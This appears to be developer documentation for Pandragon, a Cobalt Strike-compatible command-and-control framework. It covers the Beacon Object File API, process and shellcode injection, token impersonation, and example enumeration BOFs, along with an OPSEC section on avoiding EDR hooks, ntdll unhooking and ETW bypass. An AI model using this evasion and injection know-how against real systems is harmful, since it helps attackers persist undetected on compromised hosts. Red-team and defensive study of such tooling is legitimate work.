# BOF Developer Guide: Pandragon C2

Complete reference for developing, compiling, and debugging Beacon Object Files (BOFs) compatible with the Pandragon C2 framework.

---

## Table of Contents

1. [Overview](#overview)
2. [Toolchain & Compilation](#toolchain--compilation)
3. [The `beacon.h` API](#the-beaconh-api)
   - [Data Parsing](#data-parsing)
   - [Formatted Output](#formatted-output)
   - [BeaconOutput](#beaconoutput)
   - [Token Functions](#token-functions)
   - [Process Injection](#process-injection)
   - [Utility Functions](#utility-functions)
4. [Module Import Notation](#module-import-notation)
5. [Memory Management](#memory-management)
6. [Complete Examples](#complete-examples)
7. [OPSEC Best Practices](#opsec-best-practices)
8. [Debugging & Troubleshooting](#debugging--troubleshooting)
9. [Common Pitfalls](#common-pitfalls)

---

## Overview

A BOF (Beacon Object File) is a compiled COFF (`.o`) object file that the Pandragon COFF loader parses, relocates, and executes in-memory within the beacon process. No PE headers, no DLL injection; raw sections loaded and resolved at runtime.

BOFs in Pandragon are **fully compatible** with the Cobalt Strike `beacon.h` API. Code that compiles and runs in CS will run in Pandragon without modification.

---

## Toolchain & Compilation

### Prerequisites

```bash
# MinGW-w64 cross-compiler (x86_64)
apt install mingw-w64 gcc-mingw-w64-x86-64
```

### Compilation Flags

```bash
# Basic x86_64 BOF
x86_64-w64-mingw32-gcc -c mybof.c -o mybof.o

# With optimizations and no CRT dependency
x86_64-w64-mingw32-gcc -c mybof.c -o mybof.o \
    -Os -fno-stack-protector -fno-common
```

**Recommended flags:**

| Flag | Purpose |
|------|---------|
| `-c` | Compile only; no linking (produces `.o`) |
| `-Os` | Optimize for size |
| `-fno-stack-protector` | No stack canaries (freestanding beacon handles its own stack) |
| `-fno-common` | No common symbols (all symbols must be resolved at load time) |

### Architecture

```bash
# x64 BOF
x86_64-w64-mingw32-gcc -c mybof.c -o mybof.o

# x86 BOF (32-bit)
i686-w64-mingw32-gcc -c mybof.c -o mybof.o
```

### Output

The output is always a **COFF `.o` file** (not a `.exe`, `.dll`, or `.so`). This file is loaded by Pandragon's COFF loader which:
1. Parses the COFF header, section table, and symbol table
2. Applies x64 relocations (`IMAGE_REL_AMD64_REL32`, `REL32_1`, `ADDR32NB`, etc.)
3. Resolves external symbols (APIs like `kernel32$CreateFileA`)
4. Executes the `go` entry point with the provided arguments

---

## The `beacon.h` API

### Data Parsing

BOFs receive arguments from the teamserver as a binary buffer. Use the `datap` parser to unpack them.

#### `BeaconDataParse`

```c
void BeaconDataParse(datap* parser, char* buffer, int size);
```

Initialize the parser. The buffer is expected to start with a 4-byte little-endian length prefix (handled by the COFF loader automatically).

#### `BeaconDataInt`

```c
int BeaconDataInt(datap* parser);
```

Extract a 4-byte integer (little-endian) and advance the cursor.

#### `BeaconDataShort`

```c
short BeaconDataShort(datap* parser);
```

Extract a 2-byte short (little-endian) and advance the cursor.

#### `BeaconDataLength`

```c
int BeaconDataLength(datap* parser);
```

Return the number of bytes remaining in the buffer.

#### `BeaconDataExtract`

```c
char* BeaconDataExtract(datap* parser, int* size);
```

Extract a length-prefixed binary blob. The length is a 4-byte little-endian integer. Returns a pointer into the buffer (no copy). If `size` is non-NULL, the blob length is written there.

**Example:**
```c
void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int pid    = BeaconDataInt(&parser);
    short port = BeaconDataShort(&parser);

    char* filename;
    int filelen;
    filename = BeaconDataExtract(&parser, &filelen);
    // filename points to the raw bytes; filelen is the length
}
```

---

### Formatted Output

BOFs produce output via `BeaconFormat*` (buffered) or `BeaconPrintf` (immediate).

#### `BeaconFormatAlloc`

```c
void BeaconFormatAlloc(formatp* format, int maxsz);
```

Allocate a formatted output buffer of `maxsz` bytes.

#### `BeaconFormatReset`

```c
void BeaconFormatReset(formatp* format);
```

Zero the buffer and reset the cursor.

#### `BeaconFormatFree`

```c
void BeaconFormatFree(formatp* format);
```

Free the buffer and reset the structure.

#### `BeaconFormatPrintf`

```c
void BeaconFormatPrintf(formatp* format, char* fmt, ...);
```

Append a printf-formatted string to the buffer. Respects remaining space.

#### `BeaconFormatAppend`

```c
void BeaconFormatAppend(formatp* format, char* text, int len);
```

Append raw bytes to the buffer.

#### `BeaconFormatInt`

```c
void BeaconFormatInt(formatp* format, int value);
```

Append a 4-byte integer in **little-endian** byte order to the buffer.

#### `BeaconFormatToString`

```c
char* BeaconFormatToString(formatp* format, int* size);
```

Return the formatted data as a string. If `size` is non-NULL, the total length is written there. Returns a pointer to the internal buffer (do not free).

**Example:**
```c
void go(char* args, int alen) {
    formatp fmt;
    BeaconFormatAlloc(&fmt, 8192);  // 8KB buffer

    BeaconFormatPrintf(&fmt, "[*] Starting enumeration...\n");
    BeaconFormatPrintf(&fmt, "[+] PID: %d\n", GetCurrentProcessId());
    BeaconFormatPrintf(&fmt, "[+] Thread: %lu\n", GetCurrentThreadId());

    // Send output back
    BeaconOutput(CALLBACK_OUTPUT, fmt.original, fmt.length);
    BeaconFormatFree(&fmt);
}
```

#### `BeaconPrintf`

```c
void BeaconPrintf(int type, char* fmt, ...);
```

Immediate formatted output (internally buffers and sends via `CALLBACK_OUTPUT`). Simpler but less flexible than the `BeaconFormat*` API.

```c
void go(char* args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Hello from BOF\n");
}
```

---

### BeaconOutput

```c
void BeaconOutput(int type, char* data, int len);
```

Send raw output data to the teamserver. The `type` determines how the teamserver handles the output.

| Callback Type | Hex | Purpose |
|---------------|-----|---------|
| `CALLBACK_OUTPUT` | `0x0` | Text output (default) |
| `CALLBACK_OUTPUT_OEM` | `0x1E` | OEM-encoded text |
| `CALLBACK_ERROR` | `0x0D` | Error output (displayed in red) |
| `CALLBACK_OUTPUT_UTF8` | `0x20` | UTF-8 text |

**Note:** Pandragon aggregates all BOF output into a single buffer per execution. The teamserver receives the combined output after `go()` returns.

---

### Token Functions

#### `BeaconUseToken`

```c
bool BeaconUseToken(HANDLE token);
```

Apply a token to the current thread via `SetThreadToken`. Returns `true` on success.

#### `BeaconRevertToken`

```c
void BeaconRevertToken(void);
```

Revert to the process token via `RevertToSelf()`.

#### `BeaconIsAdmin`

```c
BOOL BeaconIsAdmin(void);
```

Check if the current token has admin privileges. Uses `TokenElevation` (fast path) with a `TokenGroups` SID fallback.

```c
if (BeaconIsAdmin()) {
    BeaconFormatPrintf(&fmt, "[*] Running with admin privileges\n");
} else {
    BeaconFormatPrintf(&fmt, "[!] Not running as admin\n");
}
```

---

### Process Injection

#### `BeaconGetSpawnTo`

```c
void BeaconGetSpawnTo(BOOL x86, char* buffer, int length);
```

Get the spawn-to path (rundll32.exe) for the specified architecture. Fills `buffer` with the full path.

```c
char spawnPath[260];
BeaconGetSpawnTo(FALSE, spawnPath, sizeof(spawnPath));  // x64 path
BeaconFormatPrintf(&fmt, "[*] Spawn-to: %s\n", spawnPath);
```

#### `BeaconSpawnTemporaryProcess`

```c
BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo);
```

Spawn a temporary process (rundll32.exe) with the specified architecture. The process is created with `CREATE_NO_WINDOW`.

```c
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

if (BeaconSpawnTemporaryProcess(FALSE, FALSE, &si, &pi)) {
    BeaconFormatPrintf(&fmt, "[+] Spawned x64 process: PID %lu\n", pi.dwProcessId);
    // ... inject into pi.hProcess ...
    BeaconCleanupProcess(&pi);
}
```

#### `BeaconCleanupProcess`

```c
void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo);
```

Close process and thread handles from `BeaconSpawnTemporaryProcess`.

#### `BeaconInjectProcess`

```c
void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload,
                         int payload_len, int payload_offset,
                         char* arg, int arg_len);
```

Inject shellcode into a target process using classic process injection.

#### `BeaconInjectTemporaryProcess`

```c
void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload,
                                  int payload_len, int payload_offset,
                                  char* arg, int arg_len);
```

Inject shellcode into a previously spawned temporary process.

---

### Utility Functions

#### `toWideChar`

```c
bool toWideChar(char* src, wchar_t* dst, int max);
```

Convert an ANSI string to wide (UTF-16). Returns `true` on success.

```c
wchar_t widePath[MAX_PATH];
if (toWideChar("C:\\Windows\\System32\\cmd.exe", widePath, sizeof(widePath))) {
    // widePath is now a UTF-16 string
}
```

#### `BeaconGetOutputData`

```c
char* BeaconGetOutputData(int* outsize);
```

Retrieve and transfer ownership of the internal output buffer. After calling, the beacon compatibility layer resets its buffer state.

---

## Module Import Notation

Pandragon resolves external API calls in BOFs using the **`MODULE$FunctionName`** notation. This tells the COFF loader which DLL to load and which export to resolve.

### Format

```
MODULE$FunctionName
```

| Component | Description |
|-----------|-------------|
| `MODULE` | DLL name (without `.dll` extension) |
| `$` | Separator |
| `FunctionName` | Export name (case-sensitive) |

### Common Modules

| Module | Prefix | Example |
|--------|--------|---------|
| `ntdll.dll` | `NTDLL$` | `NTDLL$NtQuerySystemInformation` |
| `kernel32.dll` | `kernel32$` | `kernel32$CreateFileA` |
| `kernel32.dll` | `kernel32$` | `kernel32$VirtualAlloc` |
| `msvcrt.dll` | `MSVCRT$` | `MSVCRT$printf` |
| `advapi32.dll` | `advapi32$` | `advapi32$RegOpenKeyExA` |
| `user32.dll` | `user32$` | `user32$MessageBoxA` |
| `ws2_32.dll` | `ws2_32$` | `ws2_32$socket` |
| `wininet.dll` | `wininet$` | `wininet$InternetOpenA` |

### Usage in Code

Declare the external function with `__declspec(dllimport)`:

```c
// Direct API call; resolved by the COFF loader
__declspec(dllimport) HANDLE __stdcall kernel32$CreateFileA(
    LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

void go(char* args, int alen) {
    HANDLE hFile = kernel32$CreateFileA("C:\\test.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileA failed: %lu\n", kernel32$GetLastError());
    }
}
```

### Pandragon-Specific Resolution

Pandragon's COFF loader also resolves internal beacon functions by name:

- `BeaconDataParse`, `BeaconDataInt`, `BeaconDataShort`, etc.
- `BeaconFormatAlloc`, `BeaconFormatPrintf`, etc.
- `BeaconOutput`, `BeaconPrintf`
- `LoadLibraryA`, `GetProcAddress`, `GetModuleHandleA`, `FreeLibrary`

These are resolved to the beacon's internal implementations, not to DLL exports.

---

## Memory Management

BOFs **must use beacon memory APIs**, not standard CRT functions. Pandragon runs without CRT.

### Safe Allocation

```c
// Use __malloc from the beacon (internally uses NtAllocateVirtualMemory)
void* buf = __malloc(4096);
if (!buf) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Allocation failed\n");
    return;
}
// ... use buf ...
__free(buf);
```

**Important:** Do not use `malloc()`, `calloc()`, or `free()` from MSVCRT unless you explicitly import them via `MSVCRT$malloc`. The beacon's `__malloc`/`__free` use `NtAllocateVirtualMemory`/`NtFreeVirtualMemory` directly.

### Buffer Limits

- **Maximum BOF output:** 1 MB (`MAX_BOF_OUTPUT_SIZE`)
- **Format buffer:** allocated via `BeaconFormatAlloc(maxsz)`; choose size based on expected output
- **Data buffer:** provided by the teamserver; use `BeaconDataLength` to check remaining bytes

### Geometric Growth

The BOF output buffer uses geometric capacity growth (1.5x) to avoid O(n²) realloc churn. Initial allocation is 1KB.

---

## Complete Examples

### Example 1: Simple File Read

Reads a file and prints its contents.

```c
#include <windows.h>

__declspec(dllimport) HANDLE __stdcall kernel32$CreateFileA(
    LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
__declspec(dllimport) BOOL __stdcall kernel32$ReadFile(
    HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
__declspec(dllimport) BOOL __stdcall kernel32$CloseHandle(HANDLE);
__declspec(dllimport) DWORD __stdcall kernel32$GetFileSize(HANDLE, LPDWORD);
__declspec(dllimport) DWORD __stdcall kernel32$GetLastError(void);

void BeaconPrintf(int type, char* fmt, ...);

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* filepath = BeaconDataExtract(&parser, NULL);
    if (!filepath) {
        BeaconPrintf(0, "[!] No file path provided\n");
        return;
    }

    HANDLE hFile = kernel32$CreateFileA(
        filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(0, "[!] CreateFileA failed: %lu\n", kernel32$GetLastError());
        return;
    }

    DWORD fileSize = kernel32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        BeaconPrintf(0, "[!] Invalid file size: %lu\n", kernel32$GetLastError());
        kernel32$CloseHandle(hFile);
        return;
    }

    char* buffer = (char*)__malloc(fileSize + 1);
    if (!buffer) {
        BeaconPrintf(0, "[!] Memory allocation failed\n");
        kernel32$CloseHandle(hFile);
        return;
    }

    DWORD bytesRead = 0;
    if (kernel32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        BeaconPrintf(0, "[+] File contents (%lu bytes):\n%s\n", bytesRead, buffer);
    } else {
        BeaconPrintf(0, "[!] ReadFile failed: %lu\n", kernel32$GetLastError());
    }

    __free(buffer);
    kernel32$CloseHandle(hFile);
}
```

### Example 2: Process Enumeration

Lists running processes using `NtQuerySystemInformation`.

```c
#include <windows.h>

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemProcessInformation = 5
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
    UNICODE_STRING ImageName;
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

__declspec(dllimport) long __stdcall NTDLL$NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

void BeaconFormatAlloc(formatp*, int);
void BeaconFormatPrintf(formatp*, char*, ...);
void BeaconFormatFree(formatp*);
void BeaconOutput(int, char*, int);
void* __malloc(unsigned long);
void __free(void*);

void go(char* args, int alen) {
    formatp fmt;
    BeaconFormatAlloc(&fmt, 65536);  // 64KB output buffer

    BeaconFormatPrintf(&fmt, "[*] Enumerating processes...\n\n");
    BeaconFormatPrintf(&fmt, "%-8s %-10s %s\n", "PID", "Handles", "Process Name");
    BeaconFormatPrintf(&fmt, "%-8s %-10s %s\n", "-------", "----------", "-------------------");

    ULONG bufSize = 0;
    NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufSize);

    if (bufSize == 0) {
        BeaconFormatPrintf(&fmt, "\n[!] NtQuerySystemInformation failed\n");
        goto cleanup;
    }

    PSYSTEM_PROCESS_INFO procInfo = (PSYSTEM_PROCESS_INFO)__malloc(bufSize);
    if (!procInfo) {
        BeaconFormatPrintf(&fmt, "\n[!] Memory allocation failed\n");
        goto cleanup;
    }

    long status = NTDLL$NtQuerySystemInformation(
        SystemProcessInformation, procInfo, bufSize, &bufSize);

    if (status != 0) {
        BeaconFormatPrintf(&fmt, "\n[!] NtQuerySystemInformation failed: 0x%lx\n", status);
        __free(procInfo);
        goto cleanup;
    }

    PSYSTEM_PROCESS_INFO current = procInfo;
    int count = 0;

    do {
        wchar_t* imageName = current->ImageName.Buffer;
        char nameBuf[260] = {0};

        if (imageName) {
            // Simple wide-to-ansi conversion
            for (int i = 0; i < 259 && imageName[i] != L'\0'; i++) {
                nameBuf[i] = (char)imageName[i];
            }
        }

        BeaconFormatPrintf(&fmt, "%-8lu %-10lu %s\n",
            (ULONG)(uintptr_t)current->UniqueProcessId,
            current->HandleCount,
            nameBuf[0] ? nameBuf : "[System Process]");

        count++;

        if (current->NextEntryOffset == 0) break;
        current = (PSYSTEM_PROCESS_INFO)((BYTE*)current + current->NextEntryOffset);
    } while (1);

    BeaconFormatPrintf(&fmt, "\n[+] Enumerated %d processes\n", count);

    BeaconOutput(0, fmt.original, fmt.length);
    __free(procInfo);

cleanup:
    BeaconFormatFree(&fmt);
}
```

### Example 3: Registry Query

Reads a registry value using `advapi32$` functions.

```c
#include <windows.h>

__declspec(dllimport) long __stdcall advapi32$RegOpenKeyExA(
    HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
__declspec(dllimport) long __stdcall advapi32$RegQueryValueExA(
    HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
__declspec(dllimport) long __stdcall advapi32$RegCloseKey(HKEY);

void BeaconDataParse(datap*, char*, int);
char* BeaconDataExtract(datap*, int*);
void BeaconFormatAlloc(formatp*, int);
void BeaconFormatPrintf(formatp*, char*, ...);
void BeaconFormatFree(formatp*);
void BeaconOutput(int, char*, int);

#define KEY_READ 0x20019

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* regPath = BeaconDataExtract(&parser, NULL);
    char* regValue = BeaconDataExtract(&parser, NULL);

    if (!regPath || !regValue) {
        BeaconOutput(0, "[!] Usage: bof <path> <value>\n", 33);
        return;
    }

    formatp fmt;
    BeaconFormatAlloc(&fmt, 4096);

    // Split path into hive and subkey
    // e.g., "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
    HKEY hive = NULL;
    LPCSTR subKey = NULL;

    if (__strncmp(regPath, "HKLM\\", 5) == 0) {
        hive = HKEY_LOCAL_MACHINE;
        subKey = regPath + 5;
    } else if (__strncmp(regPath, "HKCU\\", 5) == 0) {
        hive = HKEY_CURRENT_USER;
        subKey = regPath + 5;
    } else {
        BeaconFormatPrintf(&fmt, "[!] Invalid hive. Use HKLM\\ or HKCU\\\n");
        goto cleanup;
    }

    HKEY hKey = NULL;
    long status = advapi32$RegOpenKeyExA(hive, subKey, 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        BeaconFormatPrintf(&fmt, "[!] RegOpenKeyExA failed: 0x%lx\n", status);
        goto cleanup;
    }

    BYTE data[4096] = {0};
    DWORD dataSize = sizeof(data);
    DWORD type = 0;

    status = advapi32$RegQueryValueExA(hKey, regValue, NULL, &type, data, &dataSize);
    if (status != ERROR_SUCCESS) {
        BeaconFormatPrintf(&fmt, "[!] RegQueryValueExA failed: 0x%lx\n", status);
        advapi32$RegCloseKey(hKey);
        goto cleanup;
    }

    BeaconFormatPrintf(&fmt, "[+] Registry Value: %s\\%s\n", regPath, regValue);
    BeaconFormatPrintf(&fmt, "[+] Type: ");

    switch (type) {
        case REG_SZ:
            BeaconFormatPrintf(&fmt, "REG_SZ\n[+] Data: %s\n", data);
            break;
        case REG_DWORD:
            BeaconFormatPrintf(&fmt, "REG_DWORD\n[+] Data: %lu\n", *(DWORD*)data);
            break;
        case REG_QWORD:
            BeaconFormatPrintf(&fmt, "REG_QWORD\n[+] Data: %llu\n", *(unsigned long long*)data);
            break;
        case REG_BINARY:
            BeaconFormatPrintf(&fmt, "REG_BINARY\n[+] Data (hex): ");
            for (DWORD i = 0; i < dataSize; i++) {
                BeaconFormatPrintf(&fmt, "%02X ", data[i]);
                if ((i + 1) % 16 == 0) BeaconFormatPrintf(&fmt, "\n    ");
            }
            BeaconFormatPrintf(&fmt, "\n");
            break;
        default:
            BeaconFormatPrintf(&fmt, "UNKNOWN (0x%lx)\n", type);
            break;
    }

    advapi32$RegCloseKey(hKey);

cleanup:
    BeaconOutput(0, fmt.original, fmt.length);
    BeaconFormatFree(&fmt);
}
```

---

## OPSEC Best Practices

### 1. Avoid Hooked APIs

Prefer `NTDLL$` direct syscalls over higher-level APIs that are commonly hooked by EDR:

| Hooked | Prefer Instead |
|--------|---------------|
| `kernel32$CreateFileA` | `NTDLL$NtCreateFile` |
| `kernel32$ReadFile` | `NTDLL$NtReadFile` |
| `kernel32$WriteFile` | `NTDLL$NtWriteFile` |
| `kernel32$VirtualAlloc` | `NTDLL$NtAllocateVirtualMemory` |
| `kernel32$CreateRemoteThread` | `NTDLL$NtCreateThreadEx` |

**Note:** Pandragon's HWBP+VEH indirect syscall system bypasses user-mode hooks automatically for resolved ntdll functions. However, BOFs that import `kernel32$` functions still go through the hooked kernel32 -> ntdll chain.

### 2. Minimize Beacon Output

Large output buffers increase memory footprint and detection risk. Use targeted output:

```c
// Bad: dump everything
BeaconFormatPrintf(&fmt, "%s\n", largeBuffer);

// Good: summarize
BeaconFormatPrintf(&fmt, "[+] Found %d matches across %d files\n", matchCount, fileCount);
```

### 3. Avoid `MSVCRT$` String Functions

Use the beacon's internal `__strlen`, `__strcpy`, `__strcmp`, etc. instead of `MSVCRT$` imports. This avoids loading an additional DLL and reduces the API call footprint.

### 4. Lazy Unhook Awareness

When `lazy_unhook` is enabled in the beacon config, ntdll is only unhooked before BOF execution. This means:
- During the unhook, a clean ntdll is extracted from a suspended `cmd.exe` process
- All `NTDLL$` imports in your BOF will resolve to the **clean** (unhooked) ntdll
- This is the safest time to call sensitive APIs

### 5. Memory Cleanup

Always `__free()` what you `__malloc()`. The beacon's custom heap uses `NtFreeVirtualMemory`; leaked allocations persist in the process memory space.

```c
char* buf = (char*)__malloc(size);
if (!buf) return;
// ... use buf ...
__free(buf);  // Always free
buf = NULL;   // Prevent use-after-free
```

### 6. Handle Size Limits

- **Maximum BOF output:** 1 MB; `ensure_capacity()` will return `false` if exceeded
- **Format buffer:** sized by `BeaconFormatAlloc()`; choose appropriately
- **Input buffer:** teamserver-provided; check `BeaconDataLength()` before parsing

---

## Debugging & Troubleshooting

### Build Failures

```bash
# Undefined reference to symbol
# -> Check MODULE$FunctionName spelling; case-sensitive!
# -> Verify the DLL actually exports that function

# Relocation truncated to fit
# -> Your BOF references code/data beyond 2GB offset (rare)
# -> Split into smaller source files
```

### Runtime Errors

| Symptom | Cause | Fix |
|---------|-------|-----|
| BOF executes but no output | `BeaconOutput` not called | Ensure you call `BeaconOutput(CALLBACK_OUTPUT, fmt.original, fmt.length)` |
| "COFF loader failed" | Unresolved symbol | Check all `__declspec(dllimport)` declarations match `MODULE$FunctionName` format |
| Empty output | `BeaconFormatFree` called before `BeaconOutput` | Call `BeaconOutput` before `BeaconFormatFree` |
| Crash on execution | Stack overflow or null pointer | Check pointer validity; avoid large stack allocations |
| Partial output | Output buffer too small | Increase `BeaconFormatAlloc` size |

### Using Debug Builds

Build the beacon with `make DEBUG=1` to enable console output from `g_debugPrint` and `c_debugPrint`:

```bash
make DEBUG=1
```

Debug builds print:
- `[ETW]` messages for ETW bypass state
- `[lazy_unhook]` messages for ntdll unhooking
- `[COFF]` messages for BOF loading and symbol resolution
- `[CurlLikeRequest]` messages for HTTP traffic

### Verifying COFF Files

```bash
# Check COFF file type
file mybof.o
# Expected: "relocatable, 64-bit, x86-64"

# List symbols
x86_64-w64-mingw32-objdump -t mybof.o

# List sections
x86_64-w64-mingw32-objdump -h mybof.o
```

### Testing BOFs

1. **Compile for CS first:** If a BOF works in Cobalt Strike, it will work in Pandragon
2. **Start simple:** Test with a minimal `BeaconPrintf` BOF before complex logic
3. **Incremental complexity:** Add one API import at a time and verify resolution
4. **Check output buffer:** Always verify `BeaconOutput` is called with the correct type and length

---

## Common Pitfalls

### 1. Missing 4-byte Length Prefix

`BeaconDataParse` expects the input buffer to start with a 4-byte little-endian length prefix. The Pandragon COFF loader handles this automatically when packaging arguments, but if you're testing with raw buffers, ensure the prefix is present.

### 2. Endianness Confusion

`BeaconDataInt` and `BeaconDataShort` return **little-endian** values. On x64 (always LE), this is correct. `BeaconFormatInt` writes values in **little-endian** byte order (byte-swapped from host for CS compatibility).

### 3. Calling `BeaconFormatFree` Twice

After `BeaconFormatFree`, the buffer is freed and pointers are NULLed. Calling it again is a no-op, but using `fmt.original` or `fmt.buffer` after `BeaconFormatFree` is a **use-after-free** bug.

### 4. Forgetting to Call `BeaconOutput`

`BeaconFormatPrintf` only writes to the internal buffer. You **must** call `BeaconOutput(CALLBACK_OUTPUT, fmt.original, fmt.length)` to send the data to the teamserver.

### 5. Using CRT `printf` Instead of `BeaconPrintf`

Standard `printf` requires CRT and writes to stdout (which doesn't exist for a beacon). Always use `BeaconPrintf` or `BeaconFormatPrintf`.

### 6. Oversized Stack Allocations

Avoid large stack allocations (`char buf[1048576]`). Use `__malloc` instead:

```c
// Bad: 1MB on stack; may trigger chkstk and crash
char bigBuf[1048576];

// Good: heap allocation via NtAllocateVirtualMemory
char* bigBuf = (char*)__malloc(1048576);
if (!bigBuf) return;
// ... use bigBuf ...
__free(bigBuf);
```

### 7. Importing Non-Exported Functions

Some functions are not exported by name from DLLs. Verify the export exists:

```bash
x86_64-w64-mingw32-objdump -p C:\\Windows\\System32\\ntdll.dll | grep "FunctionName"
```

---

## BOF Execution Flow

```
Teamserver                  Pandragon Beacon
    │                              │
    │── bof <id> file.o [args] ──►│
    │                              │
    │                          Parse COFF file
    │                          Apply relocations
    │                          Resolve MODULE$ symbols
    │                          Call go(args, arglen)
    │                              │
    │◄────── Output buffer ───────│
    │                              │
```

---

## Pandragon vs Cobalt Strike Compatibility

| Feature | Cobalt Strike | Pandragon |
|---------|--------------|-----------|
| `beacon.h` API | ✅ | ✅ |
| `MODULE$FunctionName` | ✅ | ✅ |
| COFF relocation types | All x64 | All x64 |
| `BeaconData*` parsing | ✅ | ✅ |
| `BeaconFormat*` API | ✅ | ✅ |
| `BeaconInjectProcess` | ✅ | ✅ |
| `BeaconUseToken` | ✅ | ✅ |
| `BeaconIsAdmin` | ✅ | ✅ |
| Custom internal functions | Limited | `LoadLibraryA`, `GetProcAddress`, `GetModuleHandleA`, `FreeLibrary`, `__C_specific_handler` |
| Max output | Configurable | 1 MB |
| SEH support | ✅ | ✅ (forwarded to ntdll) |

---

## Quick Reference Card

```c
/* === ENTRY POINT === */
void go(char* args, int alen) { /* ... */ }

/* === DATA PARSING === */
BeaconDataParse(&parser, buffer, size);
int    val4  = BeaconDataInt(&parser);
short  val2  = BeaconDataShort(&parser);
char*  blob  = BeaconDataExtract(&parser, &bloblen);
int    left  = BeaconDataLength(&parser);

/* === FORMATTED OUTPUT === */
formatp fmt;
BeaconFormatAlloc(&fmt, 8192);
BeaconFormatPrintf(&fmt, "[*] Message: %s\n", str);
BeaconFormatAppend(&fmt, data, datalen);
BeaconOutput(CALLBACK_OUTPUT, fmt.original, fmt.length);
BeaconFormatFree(&fmt);

/* === IMMEDIATE OUTPUT === */
BeaconPrintf(CALLBACK_OUTPUT, "[*] Immediate: %d\n", val);

/* === ERROR OUTPUT === */
BeaconPrintf(CALLBACK_ERROR, "[!] Error: %lu\n", err);

/* === MEMORY === */
void* p = __malloc(size);
__free(p);

/* === TOKENS === */
if (BeaconIsAdmin()) { /* ... */ }
BeaconUseToken(hToken);
BeaconRevertToken();

/* === PROCESS === */
BeaconGetSpawnTo(FALSE, path, sizeof(path));
BeaconSpawnTemporaryProcess(FALSE, FALSE, &si, &pi);
BeaconInjectProcess(hProcess, pid, payload, plen, 0, NULL, 0);
BeaconCleanupProcess(&pi);
```
